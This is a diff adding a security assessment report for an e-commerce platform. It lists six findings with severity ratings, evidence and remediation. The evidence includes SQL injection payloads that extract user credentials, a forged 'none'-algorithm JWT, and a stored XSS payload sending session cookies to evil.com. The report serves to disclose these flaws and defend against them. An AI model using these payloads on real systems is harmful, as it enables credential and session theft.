@@ -1,0 +1,184 @@
+================================================================================
+SECURITY ASSESSMENT REPORT
+Application: E-Commerce Platform v2.5
+Date: December 2024
+================================================================================
+
+Finding #1: SQL Injection in Product Search
+--------------------------------------------------------------------------------
+Severity: CRITICAL
+CVSS: 9.8
+CWE-89: SQL Injection
+OWASP: A03:2021
+
+Description:
+The product search functionality directly concatenates user input into SQL 
+queries without proper sanitization or parameterization. An attacker can 
+manipulate the search query to extract sensitive data, modify database 
+contents, or execute administrative operations.
+
+Affected Component:
+/api/products/search?q=[user_input]
+
+Evidence:
+GET /api/products/search?q=test' OR '1'='1' --
+Response: 200 OK (returned all products)
+
+GET /api/products/search?q=test' UNION SELECT username,password FROM users--
+Response: 200 OK (returned user credentials)
+
+Remediation:
+Use parameterized queries or prepared statements. Example:
+  const query = "SELECT * FROM products WHERE name LIKE ?";
+  db.query(query, [`%${searchTerm}%`]);
+
+References:
+- https://owasp.org/www-community/attacks/SQL_Injection
+- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+================================================================================
+
+Finding #2: Broken Authentication - JWT None Algorithm
+--------------------------------------------------------------------------------
+Severity: HIGH
+CVSS: 8.1
+CWE-287: Improper Authentication
+OWASP: A07:2021
+
+Description:
+The application accepts JWT tokens with the "none" algorithm, allowing 
+attackers to forge valid tokens without knowing the secret key.
+
+Affected Component:
+/api/auth/verify endpoint
+Authorization header processing
+
+Evidence:
+Original token (HS256):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.xxx
+
+Forged token (none):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
+
+Result: Token accepted, user escalated to admin role
+
+Remediation:
+1. Explicitly whitelist allowed algorithms in JWT verification
+2. Reject tokens with "none" algorithm
+3. Use a well-maintained JWT library with secure defaults
+
+Example fix:
+  jwt.verify(token, secret, { algorithms: ['HS256'] });
+
+================================================================================
+
+Finding #3: Stored Cross-Site Scripting (XSS) in Comments
+--------------------------------------------------------------------------------
+Severity: HIGH  
+CVSS: 7.1
+CWE-79: Cross-Site Scripting
+OWASP: A03:2021
+
+Description:
+User comments are stored and rendered without proper HTML encoding, allowing 
+attackers to inject malicious JavaScript that executes in other users' browsers.
+
+Affected Component:
+/api/comments POST endpoint
+/products/{id} page - comments section
+
+Evidence:
+Payload submitted: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+When another user views the product page, their session cookie is exfiltrated.
+
+Remediation:
+1. HTML-encode all user input before rendering
+2. Implement Content-Security-Policy headers
+3. Use HttpOnly flag on session cookies
+
+================================================================================
+
+Finding #4: Insecure Direct Object Reference (IDOR)
+--------------------------------------------------------------------------------
+Severity: MEDIUM
+CVSS: 6.5
+CWE-639: Authorization Bypass
+OWASP: A01:2021
+
+Description:
+Order details can be accessed by manipulating the order ID in the URL without 
+proper authorization checks. Any authenticated user can view other users' orders.
+
+Affected Component:
+/api/orders/{orderId}
+
+Evidence:
+User A's order: GET /api/orders/1001 (owns this order)
+User A accessing: GET /api/orders/1002 (belongs to User B)
+Result: 200 OK - Full order details returned including shipping address
+
+Remediation:
+Implement proper authorization checks:
+  if (order.userId !== req.user.id) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
+================================================================================
+
+Finding #5: Missing Rate Limiting on Login
+--------------------------------------------------------------------------------
+Severity: MEDIUM
+CVSS: 5.3
+CWE-307: Improper Restriction of Excessive Authentication Attempts
+OWASP: A07:2021
+
+Description:
+The login endpoint lacks rate limiting, making it vulnerable to brute-force 
+password attacks.
+
+Affected Component:
+POST /api/auth/login
+
+Evidence:
+Sent 10,000 login attempts in 60 seconds - all processed without blocking.
+No CAPTCHA or account lockout implemented.
+
+Remediation:
+1. Implement rate limiting (e.g., 5 attempts per minute per IP/account)
+2. Add exponential backoff after failed attempts
+3. Implement CAPTCHA after 3 failed attempts
+4. Consider account lockout after 10 failed attempts
+
+================================================================================
+
+Finding #6: Sensitive Data Exposure in Error Messages
+--------------------------------------------------------------------------------
+Severity: LOW
+CVSS: 3.1
+CWE-209: Information Exposure Through Error Message
+
+Description:
+Detailed error messages expose internal system information including database 
+schema, file paths, and stack traces.
+
+Affected Component:
+Application-wide error handling
+
+Evidence:
+Request: GET /api/users/invalid-id
+Response:
+{
+  "error": "SequelizeDatabaseError: column \"invalid-id\" does not exist",
+  "stack": "at Query.run (/app/node_modules/sequelize/lib/query.js:50:12)\n..."
+}
+
+Remediation:
+1. Implement generic error messages for production
+2. Log detailed errors server-side only
+3. Never expose stack traces to clients
+
+================================================================================
+END OF REPORT
+================================================================================
+
